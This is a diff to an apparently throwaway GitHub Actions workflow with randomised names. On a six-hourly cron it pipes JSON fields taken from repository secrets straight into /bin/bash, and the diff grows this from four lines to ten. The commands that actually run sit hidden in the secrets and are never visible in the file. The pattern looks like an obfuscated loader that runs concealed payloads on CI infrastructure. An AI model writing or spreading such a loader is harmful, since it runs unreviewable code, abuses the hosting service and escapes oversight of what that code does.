@@ -2,18 +2,25 @@ name: cuifenbian7641
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
+    - cron: '11 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: cuifenbian7641
         env:
-          doz81: ${{ secrets.doz81 }}
+          lllrt61832: ${{ secrets.lllrt61832 }}
         run: |
-          echo $doz81 | jq -r .z94716 | /bin/bash
-          echo $qj9846 | jq -r .wf70492 | /bin/bash
-          echo $z60 | jq -r .sq43 | /bin/bash
-          echo $x663 | jq -r .sd5294 | /bin/bash
+          echo $lllrt61832 | jq -r .orz27269 | /bin/bash
+          echo $hmeul848 | jq -r .nipwj15013 | /bin/bash
+          echo $bn10 | jq -r .e0239 | /bin/bash
+          echo $kncpg912 | jq -r .zm1 | /bin/bash
+          echo $b2 | jq -r .tej64 | /bin/bash
+          echo $t03316 | jq -r .m19 | /bin/bash
+          echo $gcq1414 | jq -r .tvhfg3030 | /bin/bash
+          echo $xi53298 | jq -r .edsdh9 | /bin/bash
+          echo $f1828 | jq -r .lvbe1337 | /bin/bash
+          echo $ytnq0559 | jq -r .zekr44204 | /bin/bash
 
